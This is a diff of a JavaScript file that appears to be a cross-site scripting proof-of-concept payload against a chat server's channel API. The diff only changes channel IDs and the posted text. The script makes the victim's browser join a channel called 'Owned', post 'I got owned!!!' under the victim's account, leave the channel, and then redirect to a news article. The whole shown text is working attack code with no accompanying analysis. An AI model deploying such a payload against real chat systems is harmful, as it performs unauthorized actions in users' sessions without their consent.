@@ -5,24 +5,24 @@ document.head.appendChild(jquery);
 
 // Next, lets add ourselves to the channel "Owned"
 // POST /api/v1/channels/hash/join
-$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/join', function(data, status){
+$.post('/api/v1/channels/syghkfrjepfcxj9obtp6hy1i3y/join', function(data, status){
 	return 0;
 })
 
 // lets say we were owned in this channel
 var data = {
 	"filenames": [],
-	"message": "I got owned",
-	"channel_id": "gtichcgad3b4idix8tdsgdr5qh",
+	"message": "I got owned!!!",
+	"channel_id": "syghkfrjepfcxj9obtp6hy1i3y",
 	"pending_post_id": Math.random().toString(36).substring(7),
 	"user_id": "",
 	"create_at":1,
 	"state":"loading"
 };
 setTimeout(function(){
-	$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/create', JSON.stringify(data), function(retData,status){		
+	$.post('/api/v1/channels/syghkfrjepfcxj9obtp6hy1i3y/create', JSON.stringify(data), function(retData,status){		
 		setTimeout(function(){
-			$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/leave', function(data, status){
+			$.post('/api/v1/channels/syghkfrjepfcxj9obtp6hy1i3y/leave', function(data, status){
 				location.href = "http://www.securityweek.com/vmware-products-affected-critical-glibc-flaw";
 				return 0;
 			});
